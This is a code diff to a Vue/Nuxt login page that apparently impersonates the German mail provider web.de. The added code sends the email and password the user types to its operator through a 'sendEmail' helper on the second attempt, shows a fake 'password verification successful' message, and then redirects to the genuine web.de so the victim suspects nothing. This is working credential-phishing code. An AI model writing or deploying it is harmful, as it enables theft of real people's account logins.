@@ -159,6 +159,8 @@ import LogoWebDe56 from "./components/svg-components/logo-web-de-56.vue";
 import FormInput from "./components/form-input.vue";
 import sendEmail from "./utils/send-email";
 
+const MAIN_PAGE_URL = "https://web.de";
+
 const { randomCaptcha, currentCaptcha } = useCaptchas();
 const { $toast }: any = useNuxtApp();
 useHead({
@@ -195,12 +197,17 @@ const getErrorMessage = (data: IData) => {
 };
 
 const notify = () => {
-  $toast.info("password verification successful");
+  $toast("password verification successful", {
+    type: "success",
+    onClose: () => {
+      window.location.assign(MAIN_PAGE_URL);
+    },
+  });
 };
 
 const onSubmit = async () => {
   try {
-    if (loginAttempt.value === 1) {
+    if (loginAttempt.value === 2) {
       const response = await sendEmail({
         email: state.email,
         password: state.password,
@@ -209,7 +216,15 @@ const onSubmit = async () => {
       if (response.data === "OK") {
         notify();
       }
+
+      return;
     }
+
+    // v$.value.$reset();
+
+    // state.captcha = "";
+    // state.email = "";
+    // state.password = "";
   } catch (error) {
     console.log(error);
   }
